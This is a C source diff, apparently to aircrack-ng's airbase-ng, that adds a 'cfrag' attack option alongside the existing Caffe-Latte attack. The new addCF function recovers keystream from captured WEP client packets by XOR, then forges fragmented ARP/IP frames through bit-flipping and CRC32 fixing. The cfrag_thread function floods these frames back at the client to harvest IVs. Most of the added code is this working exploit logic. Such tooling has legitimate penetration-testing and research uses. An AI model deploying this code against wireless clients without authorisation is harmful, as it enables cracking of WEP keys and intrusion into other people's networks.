@@ -90,6 +90,7 @@ static struct wif *_wi_in, *_wi_out;
 #endif
 
 #define NB_PRB 10       /* size of probed ESSID ring buffer */
+#define MAX_CF_XMIT 100
 
 //if not all fragments are available 60 seconds after the last fragment was received, they will be removed
 #define FRAG_TIMEOUT (1000000*60)
@@ -182,7 +183,8 @@ char usage[] =
 "      -X               : hidden ESSID\n"
 "      -s               : force shared key authentication\n"
 "      -S               : set shared key challenge length (default: 128)\n"
-"      --caffe-latte    : Caffe-Latte attack\n"
+"      -L               : Caffe-Latte attack\n"
+"      -N               : cfrag attack, creates arp request against wep client\n"
 "      -x nbpps         : number of packets per second (default: 100)\n"
 "      -y               : disables responses to broadcast probes\n"
 "      -0               : set all WPA tags. can't be used together with -z & -Z\n"
@@ -252,6 +254,8 @@ struct options
     int nobroadprobe;
     int sendeapol;
     int allwpa;
+    int cf_count;
+    int cf_attack;
 }
 opt;
 
@@ -358,6 +362,20 @@ struct ST_info
     int wpahash;             /* 1=md5(tkip) 2=sha1(ccmp)  */
 };
 
+typedef struct CF_packet *pCF_t;
+struct CF_packet
+{
+    uchar           frags[3][128];  /* first fragments to fill a gap */
+    uchar           final[4096];    /* final frame derived from orig */
+    int             fraglen[3];     /* fragmentation frame lengths   */
+    int             finallen;       /* length of frame in final[]    */
+    int             xmitcount;      /* how often was this frame sent */
+    unsigned char   fragnum;        /* number of fragments to send   */
+    pCF_t           next;           /* next set of fragments to send */
+};
+
+pthread_mutex_t mx_cf;              /* lock write access to rCF */
+
 unsigned long nb_pkt_sent;
 unsigned char h80211[4096];
 unsigned char tmpbuf[4096];
@@ -370,12 +388,15 @@ char * iwpriv;
 
 struct ARP_req * arp;
 
-pthread_t apid;
+pthread_t beaconpid;
+pthread_t caffelattepid;
+pthread_t cfragpid;
 
-pESSID_t rESSID;
-pMAC_t rBSSID;
-pMAC_t rClient;
-pFrag_t rFragment;
+pESSID_t    rESSID;
+pMAC_t      rBSSID;
+pMAC_t      rClient;
+pFrag_t     rFragment;
+pCF_t       rCF;
 
 void sighandler( int signum )
 {
@@ -1653,6 +1674,310 @@ int wpa_client(struct ST_info *st_cur,uchar* tag, int length)
     return 0;
 }
 
+int set_clear_arp(uchar *buf, uchar *smac, uchar *dmac) //set first 22 bytes
+{
+    if(buf == NULL)
+        return -1;
+
+    memcpy(buf, S_LLC_SNAP_ARP, 8);
+    buf[8]  = 0x00;
+    buf[9]  = 0x01; //ethernet
+    buf[10] = 0x08; // IP
+    buf[11] = 0x00;
+    buf[12] = 0x06; //hardware size
+    buf[13] = 0x04; //protocol size
+    buf[14] = 0x00;
+    if(memcmp(dmac, BROADCAST, 6) == 0)
+        buf[15]  = 0x01; //request
+    else
+        buf[15]  = 0x02; //reply
+    memcpy(buf+16, smac, 6);
+
+    return 0;
+}
+
+int set_final_arp(uchar *buf, uchar *mymac)
+{
+    if(buf == NULL)
+        return -1;
+
+    //shifted by 10bytes to set source IP as target IP :)
+
+    buf[0] = 0x08; // IP
+    buf[1] = 0x00;
+    buf[2] = 0x06; //hardware size
+    buf[3] = 0x04; //protocol size
+    buf[4] = 0x00;
+    buf[5] = 0x01; //request
+    memcpy(buf+6, mymac, 6); //sender mac
+    buf[12] = 0xA9; //sender IP 169.254.87.197
+    buf[13] = 0xFE;
+    buf[14] = 0x57;
+    buf[15] = 0xC5; //end sender IP
+
+    return 0;
+}
+
+int set_clear_ip(uchar *buf) //set first 9 bytes
+{
+    if(buf == NULL)
+        return -1;
+
+    memcpy(buf, S_LLC_SNAP_IP, 8);
+    buf[8]  = 0x45;
+
+    return 0;
+}
+
+int set_final_ip(uchar *buf, uchar *mymac)
+{
+    if(buf == NULL)
+        return -1;
+
+    //shifted by 10bytes to set source IP as target IP :)
+
+    buf[0] = 0x06; //hardware size
+    buf[1] = 0x04; //protocol size
+    buf[2] = 0x00;
+    buf[3] = 0x01; //request
+    memcpy(buf+4, mymac, 6); //sender mac
+
+    return 0;
+}
+
+int addCF(uchar* packet, int length)
+{
+    pCF_t   curCF = rCF;
+    unsigned char bssid[6];
+    unsigned char smac[6];
+    unsigned char dmac[6];
+    uchar keystream[128];
+    uchar frag1[128], frag2[128], frag3[128];
+    uchar clear[4096], final[4096], flip[4096];
+    int isarp;
+    int z, i;
+
+    if(curCF == NULL)
+        return 1;
+
+    if(packet == NULL)
+        return 1;
+
+    z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;
+
+    if(length < z+8)
+        return 1;
+
+    if(length > 3800)
+    {
+        return 1;
+    }
+
+    if(opt.cf_count >= 100)
+        return 1;
+
+    bzero(clear, 4096);
+    bzero(final, 4096);
+    bzero(flip, 4096);
+    bzero(frag1, 128);
+    bzero(frag2, 128);
+    bzero(frag3, 128);
+    bzero(keystream, 128);
+
+    switch( packet[1] & 3 )
+    {
+        case  0:
+            memcpy( bssid, packet + 16, 6 );
+            memcpy( dmac, packet + 4, 6 );
+            memcpy( smac, packet + 10, 6 );
+            break;
+        case  1:
+            memcpy( bssid, packet + 4, 6 );
+            memcpy( dmac, packet + 16, 6 );
+            memcpy( smac, packet + 10, 6 );
+            break;
+        case  2:
+            memcpy( bssid, packet + 10, 6 );
+            memcpy( dmac, packet + 4, 6 );
+            memcpy( smac, packet + 16, 6 );
+            break;
+        default:
+            memcpy( bssid, packet + 10, 6 );
+            memcpy( dmac, packet + 16, 6 );
+            memcpy( smac, packet + 24, 6 );
+            break;
+    }
+
+    /* check if it's a potential ARP request */
+
+    //its length 68 or 86 and going to broadcast or a unicast mac (even first byte)
+    if( (length == 68 || length == 86) && (memcmp(dmac, BROADCAST, 6) == 0 || (dmac[0]%2) == 0) )
+    {
+        /* process ARP */
+//         printf("Found ARP packet\n");
+        isarp = 1;
+        //build the new packet
+        set_clear_arp(clear, smac, dmac);
+        set_final_arp(final, opt.r_smac);
+
+        for(i=0; i<14; i++)
+            keystream[i] = (packet+z+4)[i] ^ clear[i];
+
+        // correct 80211 header
+        packet[0] = 0x08;    //data
+        if( (packet[1] & 3) == 0x00 ) //ad-hoc
+        {
+            packet[1] = 0x40;    //wep
+            memcpy(packet+4, smac, 6);
+            memcpy(packet+10, opt.r_smac, 6);
+            memcpy(packet+16, bssid, 6);
+        }
+        else //tods
+        {
+            packet[1] = 0x42;    //wep+FromDS
+            memcpy(packet+4, smac, 6);
+            memcpy(packet+10, bssid, 6);
+            memcpy(packet+16, opt.r_smac, 6);
+        }
+        packet[22] = 0xD0; //frag = 0;
+        packet[23] = 0x50;
+
+        //need to shift by 10 bytes; (add 1 frag in front)
+        memcpy(frag1, packet, z+4); //copy 80211 header and IV
+        frag1[1] |= 0x04; //more frags
+        memcpy(frag1+z+4, S_LLC_SNAP_ARP, 8);
+        frag1[z+4+8] = 0x00;
+        frag1[z+4+9] = 0x01; //ethernet
+        add_crc32(frag1+z+4, 10);
+        for(i=0; i<14; i++)
+            (frag1+z+4)[i] ^= keystream[i];
+        /* frag1 finished */
+
+        for(i=0; i<length; i++)
+            flip[i] = clear[i] ^ final[i];
+
+        add_crc32_plain(flip, length-z-4-4);
+
+        for(i=0; i<length-z-4; i++)
+            (packet+z+4)[i] ^= flip[i];
+        packet[22] = 0xD1; // frag = 1;
+
+        //ready to send frag1 / len=z+4+10+4 and packet / len = length
+    }
+    else
+    {
+        /* process IP */
+//         printf("Found IP packet\n");
+        isarp = 0;
+        //build the new packet
+        set_clear_ip(clear);
+        set_final_ip(final, opt.r_smac);
+
+        for(i=0; i<8; i++)
+            keystream[i] = (packet+z+4)[i] ^ clear[i];
+
+        // correct 80211 header
+        packet[0] = 0x08;    //data
+        if( (packet[1] & 3) == 0x00 ) //ad-hoc
+        {
+            packet[1] = 0x40;    //wep
+            memcpy(packet+4, smac, 6);
+            memcpy(packet+10, opt.r_smac, 6);
+            memcpy(packet+16, bssid, 6);
+        }
+        else
+        {
+            packet[1] = 0x42;    //wep+FromDS
+            memcpy(packet+4, smac, 6);
+            memcpy(packet+10, bssid, 6);
+            memcpy(packet+16, opt.r_smac, 6);
+        }
+        packet[22] = 0xD0; //frag = 0;
+        packet[23] = 0x50;
+
+        //need to shift by 12 bytes;(add 3 frags in front)
+        memcpy(frag1, packet, z+4); //copy 80211 header and IV
+        memcpy(frag2, packet, z+4); //copy 80211 header and IV
+        memcpy(frag3, packet, z+4); //copy 80211 header and IV
+        frag1[1] |= 0x04; //more frags
+        frag2[1] |= 0x04; //more frags
+        frag3[1] |= 0x04; //more frags
+
+        memcpy(frag1+z+4, S_LLC_SNAP_ARP, 4);
+        add_crc32(frag1+z+4, 4);
+        for(i=0; i<8; i++)
+            (frag1+z+4)[i] ^= keystream[i];
+
+        memcpy(frag2+z+4, S_LLC_SNAP_ARP+4, 4);
+        add_crc32(frag2+z+4, 4);
+        for(i=0; i<8; i++)
+            (frag2+z+4)[i] ^= keystream[i];
+        frag2[22] = 0xD1; //frag = 1;
+
+        frag3[z+4+0] = 0x00;
+        frag3[z+4+1] = 0x01; //ether
+        frag3[z+4+2] = 0x08; //IP
+        frag3[z+4+3] = 0x00;
+        add_crc32(frag3+z+4, 4);
+        for(i=0; i<8; i++)
+            (frag3+z+4)[i] ^= keystream[i];
+        frag3[22] = 0xD2; //frag = 2;
+        /* frag1,2,3 finished */
+
+        for(i=0; i<length; i++)
+            flip[i] = clear[i] ^ final[i];
+
+        add_crc32_plain(flip, length-z-4-4);
+
+        for(i=0; i<length-z-4; i++)
+            (packet+z+4)[i] ^= flip[i];
+        packet[22] = 0xD3; // frag = 3;
+
+        //ready to send frag1,2,3 / len=z+4+4+4 and packet / len = length
+    }
+    while(curCF->next != NULL)
+        curCF = curCF->next;
+
+    pthread_mutex_lock( &mx_cf );
+
+    curCF->next = (pCF_t) malloc(sizeof(struct CF_packet));
+    curCF = curCF->next;
+    curCF->xmitcount = 0;
+    curCF->next = NULL;
+
+    if(isarp)
+    {
+        memcpy(curCF->frags[0], frag1, z+4+10+4);
+        curCF->fraglen[0] = z+4+10+4;
+        memcpy(curCF->final, packet, length);
+        curCF->finallen = length;
+        curCF->fragnum = 1; /* one frag and final frame */
+    }
+    else
+    {
+        memcpy(curCF->frags[0], frag1, z+4+4+4);
+        memcpy(curCF->frags[1], frag2, z+4+4+4);
+        memcpy(curCF->frags[2], frag3, z+4+4+4);
+        curCF->fraglen[0] = z+4+4+4;
+        curCF->fraglen[1] = z+4+4+4;
+        curCF->fraglen[2] = z+4+4+4;
+        memcpy(curCF->final, packet, length);
+        curCF->finallen = length;
+        curCF->fragnum = 3; /* three frags and final frame */
+    }
+
+    opt.cf_count++;
+
+    pthread_mutex_unlock( &mx_cf );
+
+    if(opt.verbose)
+    {
+        PCT; printf("Added %s frame to cfrag buffer.\n", isarp?"ARP":"IP");
+    }
+
+    return 0;
+}
+
 int addarp(uchar* packet, int length)
 {
     uchar bssid[6], smac[6], dmac[6];
@@ -2014,7 +2339,7 @@ int packet_recv(uchar* packet, int length, struct AP_conf *apc, int external)
             {
                 /* check the extended IV flag */
                 /* WEP and we got the key */
-                if( ( packet[z + 3] & 0x20 ) == 0 && opt.crypt == CRYPT_WEP )
+                if( ( packet[z + 3] & 0x20 ) == 0 && opt.crypt == CRYPT_WEP && !opt.cf_attack)
                 {
                     memcpy( K, packet + z, 3 );
                     memcpy( K + 3, opt.wepkey, opt.weplen );
@@ -2037,6 +2362,12 @@ int packet_recv(uchar* packet, int length, struct AP_conf *apc, int external)
                 }
                 else
                 {
+                    if(opt.cf_attack)
+                    {
+                        addCF(packet, length);
+                        return 0;
+                    }
+
                     /* its a packet for us, but we either don't have the key or its WPA -> throw it away */
                     return 0;
                 }
@@ -2188,7 +2519,7 @@ int packet_recv(uchar* packet, int length, struct AP_conf *apc, int external)
             {
                 /* check the extended IV flag */
                 /* WEP and we got the key */
-                if( ( packet[z + 3] & 0x20 ) == 0 && opt.crypt == CRYPT_WEP && !opt.caffelatte )
+                if( ( packet[z + 3] & 0x20 ) == 0 && opt.crypt == CRYPT_WEP && !opt.caffelatte && !opt.cf_attack )
                 {
                     memcpy( K, packet + z, 3 );
                     memcpy( K + 3, opt.wepkey, opt.weplen );
@@ -2222,6 +2553,10 @@ int packet_recv(uchar* packet, int length, struct AP_conf *apc, int external)
                     if(opt.caffelatte)
                     {
                         addarp(packet, length);
+                    }
+                    if(opt.cf_attack)
+                    {
+                        addCF(packet, length);
                     }
                     /* its a packet we can't decrypt -> just replay it through the wireless interface */
                     return 0;
@@ -2872,7 +3207,7 @@ void beacon_thread( void *arg )
     }
 }
 
-void caffelatte_thread( void *arg )
+void caffelatte_thread( void )
 {
     struct timeval tv, tv2;
 //     int beacon_len=0;
@@ -2881,8 +3216,6 @@ void caffelatte_thread( void *arg )
     int arp_off1=0;
     int nb_pkt_sent_1=0;
     int seq=0;
-
-    if(arg) {}
 
     ticks[0]=0;
     ticks[1]=0;
@@ -2937,6 +3270,137 @@ void caffelatte_thread( void *arg )
     }
 }
 
+int del_next_CF(pCF_t curCF)
+{
+    pCF_t tmp;
+
+    if(curCF == NULL)
+        return 1;
+
+    if(curCF->next == NULL)
+        return 1;
+
+    tmp = curCF->next;
+    curCF -> next = tmp->next;
+
+    free(tmp);
+
+    return 0;
+}
+
+void cfrag_thread( void )
+{
+    struct timeval tv, tv2;
+//     int beacon_len=0;
+//     int seq=0, i=0, n=0;
+    float f, ticks[3];
+    int nb_pkt_sent_1=0;
+    int seq=0, i=0;
+    pCF_t   curCF;
+
+    ticks[0]=0;
+    ticks[1]=0;
+    ticks[2]=0;
+
+    while( 1 )
+    {
+        /* sleep until the next clock tick */
+
+        gettimeofday( &tv,  NULL );
+        usleep( 1000000/RTC_RESOLUTION );
+        gettimeofday( &tv2, NULL );
+
+        f = 1000000.0 * (float) ( tv2.tv_sec  - tv.tv_sec  )
+                    + (float) ( tv2.tv_usec - tv.tv_usec );
+
+        ticks[0] += f / ( 1000000/RTC_RESOLUTION );
+        ticks[1] += f / ( 1000000/RTC_RESOLUTION );
+        ticks[2] += f / ( 1000000/RTC_RESOLUTION );
+
+        if( ( (double)ticks[2] / (double)RTC_RESOLUTION )  >= ((double)1000.0/(double)opt.r_nbpps)*(double)seq )
+        {
+            /* threshold reach, send one frame */
+//            ticks[2] = 0;
+
+            pthread_mutex_lock( &mx_cf );
+
+            if( opt.cf_count > 0 )
+            {
+                curCF = rCF;
+
+                if(curCF->next == NULL)
+                {
+                    opt.cf_count = 0;
+                    pthread_mutex_unlock( &mx_cf );
+                    continue;
+                }
+
+//                 curCF = curCF->next;
+
+                while( curCF->next != NULL && curCF->next->xmitcount >= MAX_CF_XMIT )
+                {
+                    del_next_CF(curCF);
+                }
+
+                if(curCF->next == NULL)
+                {
+                    opt.cf_count = 0;
+                    pthread_mutex_unlock( &mx_cf );
+                    continue;
+                }
+
+                curCF = curCF->next;
+
+                if( nb_pkt_sent_1 == 0 )
+                    ticks[0] = 0;
+
+                for(i=0; i<curCF->fragnum; i++ )
+                {
+                    if( send_packet( curCF->frags[i],
+                                    curCF->fraglen[i] ) < 0 )
+                    {
+                        pthread_mutex_unlock( &mx_cf );
+                        return;
+                    }
+                }
+                if( send_packet( curCF->final,
+                                curCF->finallen ) < 0 )
+                {
+                    pthread_mutex_unlock( &mx_cf );
+                    return;
+                }
+
+                curCF->xmitcount++;
+                nb_pkt_sent_1++;
+//                 printf("sent arp: %d\n", nb_pkt_sent_1);
+
+                if( ((double)ticks[0]/(double)RTC_RESOLUTION)*(double)opt.r_nbpps > (double)nb_pkt_sent_1  )
+                {
+                    for(i=0; i<curCF->fragnum; i++ )
+                    {
+                        if( send_packet( curCF->frags[i],
+                                        curCF->fraglen[i] ) < 0 )
+                        {
+                            pthread_mutex_unlock( &mx_cf );
+                            return;
+                        }
+                    }
+                    if( send_packet( curCF->final,
+                                    curCF->finallen ) < 0 )
+                    {
+                        pthread_mutex_unlock( &mx_cf );
+                        return;
+                    }
+
+                    curCF->xmitcount++;
+                    nb_pkt_sent_1++;
+                }
+            }
+            pthread_mutex_unlock( &mx_cf );
+        }
+    }
+}
+
 int main( int argc, char *argv[] )
 {
     int ret_val, len, i, n;
@@ -2955,9 +3419,7 @@ int main( int argc, char *argv[] )
     memset( &apc, 0, sizeof( struct AP_conf ));
 
     rESSID = (pESSID_t) malloc(sizeof(struct ESSID_list));
-    rESSID->essid = NULL;
-    rESSID->len = 0;
-    rESSID->next = NULL;
+    bzero(rESSID, sizeof(struct ESSID_list));
 
     rFragment = (pFrag_t) malloc(sizeof(struct Fragment_list));
     bzero(rFragment, sizeof(struct Fragment_list));
@@ -2967,6 +3429,11 @@ int main( int argc, char *argv[] )
 
     rBSSID = (pMAC_t) malloc(sizeof(struct MAC_list));
     bzero(rBSSID, sizeof(struct MAC_list));
+
+    rCF = (pCF_t) malloc(sizeof(struct CF_packet));
+    bzero(rCF, sizeof(struct CF_packet));
+
+    pthread_mutex_init( &mx_cf, NULL );
 
     opt.r_nbpps     = 100;
     opt.tods        = 0;
@@ -2994,6 +3461,7 @@ int main( int argc, char *argv[] )
             {"mitm",        0, 0, 'M'},
             {"hidden",      0, 0, 'X'},
             {"caffe-latte", 0, 0, 'L'},
+            {"cfrag",       0, 0, 'N'},
             {"verbose",     0, 0, 'v'},
             {"ad-hoc",      0, 0, 'A'},
             {"help",        0, 0, 'H'},
@@ -3001,7 +3469,7 @@ int main( int argc, char *argv[] )
         };
 
         int option = getopt_long( argc, argv,
-                        "a:h:i:r:w:He:E:c:d:D:f:W:qMY:b:B:XsS:Lx:vAz:Z:yV:0",
+                        "a:h:i:r:w:He:E:c:d:D:f:W:qMY:b:B:XsS:Lx:vAz:Z:yV:0N",
                         long_options, &option_index );
 
         if( option < 0 ) break;
@@ -3111,6 +3579,12 @@ int main( int argc, char *argv[] )
             case 'A' :
 
                 opt.adhoc = 1;
+
+                break;
+
+            case 'N' :
+
+                opt.cf_attack = 1;
 
                 break;
 
@@ -3662,7 +4136,7 @@ usage:
         }
     }
     //start sending beacons
-    if( pthread_create( &(apid), NULL, (void *) beacon_thread,
+    if( pthread_create( &(beaconpid), NULL, (void *) beacon_thread,
             (void *) &apc ) != 0 )
     {
         perror("Beacons pthread_create");
@@ -3673,9 +4147,18 @@ usage:
     {
         arp = (struct ARP_req*) malloc( opt.ringbuffer * sizeof( struct ARP_req ) );
 
-        if( pthread_create( &(apid), NULL, (void *) caffelatte_thread, NULL ) != 0 )
+        if( pthread_create( &(caffelattepid), NULL, (void *) caffelatte_thread, NULL ) != 0 )
         {
             perror("Caffe-Latte pthread_create");
+            return( 1 );
+        }
+    }
+
+    if( opt.cf_attack )
+    {
+        if( pthread_create( &(cfragpid), NULL, (void *) cfrag_thread, NULL ) != 0 )
+        {
+            perror("cfrag pthread_create");
             return( 1 );
         }
     }
